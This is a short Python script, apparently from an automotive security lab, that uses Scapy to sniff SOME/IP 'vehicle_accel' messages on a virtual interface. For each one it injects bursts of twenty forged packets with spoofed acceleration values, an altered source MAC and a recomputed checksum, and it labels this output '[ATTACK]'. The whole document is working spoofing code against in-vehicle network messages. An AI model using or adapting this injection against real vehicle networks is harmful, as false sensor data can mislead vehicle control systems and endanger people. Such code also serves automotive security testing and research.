from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
import pdb
import time
import struct

accel_x, accel_y, accel_z = 1.0, 2.0, 3.0
def process_packet(packet):
    global accel_x
    global accel_y
    global accel_z

    if packet.haslayer(IP) and packet.haslayer(UDP):
        if packet.haslayer(SOMEIP):
            print("someip - vehicle_accel!")
            #packet[SOMEIP].session_id += 1
            packets = []
            for _ in range(20):
                data = struct.pack('>fff', accel_x, accel_y, accel_z)
                packet[SOMEIP].payload = Raw(load=data)
                packet[IP].ttl = 4
                packet[Ether].src = '00:00:00:00:00:08'
                packet = update_udp_chksum(packet)
                accel_x += 1
                accel_y += 1
                accel_z += 1
                packets.append(packet)
            print("[ATTACK] send attack packets per 0.01s, sleep for 5s")
            sendp(packets, iface='veth0.3', inter=0.01)
            time.sleep(5)


filter = "udp and src host 10.0.3.2 and src port 31002"
sniff(filter=filter, iface='veth0.3', prn=process_packet)

